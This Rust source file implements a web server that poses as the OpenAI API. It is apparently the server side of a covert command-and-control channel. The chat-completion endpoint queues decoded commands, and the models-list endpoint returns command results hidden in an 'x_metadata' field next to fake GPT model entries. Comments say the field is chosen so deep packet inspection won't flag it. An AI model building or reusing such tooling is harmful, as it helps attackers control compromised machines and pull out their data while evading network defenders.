use axum::{
    extract::State,
    http::{HeaderMap, StatusCode},
    Json,
};
use serde_json::Value;
use std::sync::Arc;
use tokio::sync::RwLock;

use super::codec::*;

pub struct AgenticState {
    pub command_queue: RwLock<Vec<(usize, String, Vec<String>)>>,
    pub result_queue: RwLock<Vec<(usize, String)>>,
    pub api_keys: Vec<String>,
}

impl AgenticState {
    pub fn new(api_keys: Vec<String>) -> Self {
        Self {
            command_queue: RwLock::new(Vec::new()),
            result_queue: RwLock::new(Vec::new()),
            api_keys,
        }
    }
}

fn validate_bearer_token(headers: &HeaderMap, valid_keys: &[String]) -> bool {
    headers
        .get("authorization")
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "))
        .map(|token| valid_keys.iter().any(|k| k == token))
        .unwrap_or(false)
}

pub async fn handle_chat_completion(
    State(state): State<Arc<AgenticState>>,
    headers: HeaderMap,
    Json(req): Json<ChatCompletionRequest>,
) -> Result<Json<ChatCompletionResponse>, StatusCode> {
    if !validate_bearer_token(&headers, &state.api_keys) {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let (id, command, args) = decode_command(&req).map_err(|_| StatusCode::BAD_REQUEST)?;

    state
        .command_queue
        .write()
        .await
        .push((id, command, args));

    let response = encode_result(id, "queued");
    Ok(Json(response))
}

pub async fn handle_models_list(
    State(state): State<Arc<AgenticState>>,
    headers: HeaderMap,
) -> Result<Json<Value>, StatusCode> {
    if !validate_bearer_token(&headers, &state.api_keys) {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let results = state.result_queue.write().await.drain(..).collect::<Vec<_>>();

    let encoded_results: Vec<Value> = results
        .iter()
        .map(|(id, result)| {
            let resp = encode_result(*id, result);
            serde_json::to_value(&resp).unwrap_or(Value::Null)
        })
        .collect();

    // Embed results in a field that looks like model metadata
    let response = serde_json::json!({
        "object": "list",
        "data": [
            {
                "id": "gpt-4",
                "object": "model",
                "created": 1687882411u64,
                "owned_by": "openai",
                "permission": [],
                "root": "gpt-4",
                "parent": null,
            },
            {
                "id": "gpt-3.5-turbo",
                "object": "model",
                "created": 1677610602u64,
                "owned_by": "openai",
                "permission": [],
                "root": "gpt-3.5-turbo",
                "parent": null,
            }
        ],
        // Results piggyback on a header-like field DPI won't flag
        "x_metadata": encoded_results,
    });

    Ok(Json(response))
}
